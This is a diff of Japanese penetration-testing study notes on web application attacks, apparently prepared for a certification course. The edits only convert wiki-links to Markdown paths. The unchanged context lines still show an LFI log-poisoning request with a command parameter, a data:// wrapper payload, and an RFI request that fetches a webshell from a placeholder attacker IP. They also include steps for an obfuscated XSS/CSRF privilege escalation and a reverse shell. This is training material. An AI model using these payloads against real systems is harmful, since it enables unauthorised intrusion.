@@ -5,7 +5,7 @@
 - LinuxシステムのApache Webアプリでは`/var/www/html`がWebのrootディレクトリとして使われることが多い
 	- → つまり、例えば、http://example.com/file.txtと入力すると、`/var/www/html/file.txt`にアクセスできるということ
 - WindowsシステムのIIS Webアプリでは、`C:\inetpub\wwwroot`
-- このディレクトリに書き込み可能なら、Webshell獲得できるかも（[[What is the shell#注意＆Tips]]）
+- このディレクトリに書き込み可能なら、Webshell獲得できるかも（[What is the shell](../Cheatsheet/Common/What%20is%20the%20shell.md#注意＆Tips)）
 
 ---
 
@@ -31,7 +31,7 @@
 	- 使われている技術が直接脆弱性につながるわけではないが、バージョンによっては重大な脆弱性が隠れていることがある
 
 - ==すべてのリンク、アクセス可能なサイト、ボタン、ソースコードをよく観察すること==
-	- [[#リンクから得られる情報例]]
+	- [Module 8 x Module 9： Web Application Attacks](Module%208%20x%20Module%209：%20Web%20Application%20Attacks.md#リンクから得られる情報例)
 ![[Pasted image 20250322134733.png]]
 
 ### リンクから得られる情報例
@@ -59,20 +59,20 @@ https://example.com/cms/login.php?language=en.html
 ## Information disclosure
 
 - BSCPのInformation disclosureのノートを参照
-	- →[[🔍Information disclosure ・ Access control ・ GraphQL]]
+	- →[🔍Information disclosure ・ Access control ・ GraphQL](../../BSCP/Server-side/Access%20control/🔍Information%20disclosure%20・%20Access%20control%20・%20GraphQL.md)
 
 ---
 
 ## API Test
 
-- 基本はBSCPのAPI testingノートを参照→[[🔍API testing]]
-- API endpointの探索は、[[👻Gobuster#Summery Gobuster]]を参照
+- 基本はBSCPのAPI testingノートを参照→[🔍API testing](../../BSCP/Server-side/API%20testing/🔍API%20testing.md)
+- API endpointの探索は、[👻Gobuster](../Tools/👻Gobuster.md#Summery%20Gobuster)を参照
 
 ---
 
 ## XSS
 
-- 基本はBSCP valutのXSSノートを参照→[[🔍XSS]]
+- 基本はBSCP valutのXSSノートを参照→[🔍XSS](../../BSCP/Client-side/XSS/🔍XSS.md)
 
 ### 具体例：Privilege Escalation w/XSS & CSRF
 
@@ -115,7 +115,7 @@ ajaxRequest.send(params);
 ```
 	(1行目に、アクションのHTTP POSTリクエストのパラメタ、かつ、必須の値を指定している)
 
-4. [[Web攻撃の難読化]]のJS: CharCodeAt()に従い難読化する。
+4. [Web攻撃の難読化](../Cheatsheet/Stealth&Evasion/Web攻撃の難読化.md)のJS: CharCodeAt()に従い難読化する。
 5. 難読化したスクリプトをBurpSuiteを用いてXSSに脆弱な箇所に埋め込み、ルートディレクトリへGETリクエストをSend（`<script></script>`で囲む）
 ![[Pasted image 20250321200240.png]]
 
@@ -129,7 +129,7 @@ ajaxRequest.send(params);
 
 ## Path traversal
 
-- BSCP valutのPath traversalノートを参照→[[🔍Path traversal]]
+- BSCP valutのPath traversalノートを参照→[🔍Path traversal](../../BSCP/Server-side/Path%20traversal/🔍Path%20traversal.md)
 
 ---
 
@@ -182,7 +182,7 @@ meteor/index.php?page=../../../../../var/log/apache2/access.log&cmd=ps HTTP/1.1
 ```
 （`ps`の結果が返ったら成功）
 
-4. リバースシェルリスナーを立て、[[忘れがちなコマンド(Linux・Windows)#bashでリバースシェルを確立する基本的なコマンド]]をURLエンコードして実行
+4. リバースシェルリスナーを立て、[忘れがちなコマンド(Linux・Windows)](../Cheatsheet/Common/忘れがちなコマンド(Linux・Windows).md#bashでリバースシェルを確立する基本的なコマンド)をURLエンコードして実行
 
 ### PHP Wrappers
 
@@ -276,7 +276,7 @@ GET /index.php?page=data://text/plain;base64,<base64_encoded_php_code>&cmd=ls"
 #### RFIの概要
 
 - 用途：LFIとほぼ同じ。異なるのは、HTTP1やSMB2を介して<u>リモートシステム</u>(攻撃者のホストするサーバ等)からファイルをインクルード可能なところ
-- シチュエーション・使い方：LFIと同じ → [[#LFI x ログポイズニング]]
+- シチュエーション・使い方：LFIと同じ → [Module 8 x Module 9： Web Application Attacks](Module%208%20x%20Module%209：%20Web%20Application%20Attacks.md#LFI%20x%20ログポイズニング)
 - ⚠️注意：PHPの[`allow_url_include`]([https://www.php.net/manual/en/filesystem.configuration.php](https://www.php.net/manual/en/filesystem.configuration.php))が有効でないと使えない（デフォルト無効）
 
 #### RFI実行手順
@@ -302,4 +302,4 @@ GET /index.php?page=http://<AttackerIP>/<webshell.php>&cmd=ls
 
 ## 開発者ツール
 
-- BSCPノートを参照→[[開発者ツール]]
+- BSCPノートを参照→[開発者ツール](../../BSCP/Misc/開発者ツール.md)
